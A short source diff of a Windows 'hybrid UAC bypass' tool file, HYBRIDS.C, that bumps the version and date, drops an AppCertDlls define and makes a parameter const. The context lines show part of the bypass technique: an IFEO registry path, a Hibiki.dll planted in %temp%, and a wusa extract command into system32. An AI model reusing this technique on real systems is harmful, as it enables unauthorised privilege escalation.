@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     1.60
+*  VERSION:     1.70
 *
-*  DATE:        20 Apr 2015
+*  DATE:        24 Apr 2015
 *
 *  Hybrid UAC bypass methods.
 *
@@ -20,7 +20,6 @@
 #include "makecab.h"
 
 #define T_IFEO						L"MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
-#define T_APPCERT					L"AppCertDlls"
 #define T_AVRFDLL					L"Hibiki.dll"
 #define T_AVRF_SOURCEDLL			L"%temp%\\Hibiki.dll"
 #define T_AVRF_CMDLINE				L"/c wusa %ws /extract:%%windir%%\\system32"
@@ -36,7 +35,7 @@
 *
 */
 BOOL ucmAvrfMethod(
-	PVOID AvrfDll,
+	CONST PVOID AvrfDll,
 	DWORD AvrfDllSize
 	)
 {
